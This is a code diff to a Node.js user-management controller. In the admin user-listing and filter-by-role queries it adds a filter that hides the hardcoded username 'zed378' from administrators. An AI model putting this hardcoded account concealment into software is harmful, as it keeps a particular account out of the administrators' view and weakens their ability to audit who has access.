@@ -1,4 +1,5 @@
 const { Users } = require("../../models");
+const { Op } = require("sequelize");
 const { delImg } = require("../middleware/deleteImage");
 const bcrypt = require("bcrypt");
 const saltRounds = 12;
@@ -21,6 +22,9 @@ exports.getAllUser = async (req, res) => {
 
     if (role === "SYS" || role === "ADMIN") {
       const data = await Users.findAndCountAll({
+        where: {
+          username: { [Op.ne]: "zed378" },
+        },
         attributes: {
           exclude: ["password", "updatedAt", "otp", "otpToken", "token"],
         },
@@ -69,7 +73,10 @@ exports.filterdUserByRole = async (req, res) => {
 
     if (userRole === "SYS" || userRole === "ADMIN") {
       const data = await Users.findAndCountAll({
-        where: { role },
+        where: {
+          role,
+          username: { [Op.ne]: "zed378" },
+        },
         attributes: {
           exclude: ["password", "updatedAt", "otp", "otpToken", "token"],
         },
@@ -491,7 +498,9 @@ exports.deleteUser = async (req, res) => {
     }
 
     if (role === "SYS" || role === "ADMIN") {
-      await Users.destroy({ where: { id } }).then(() => {
+      await Users.destroy({
+        where: { id },
+      }).then(() => {
         res.status(200).send({
           status: "Success",
           message: "User successfully deleted",
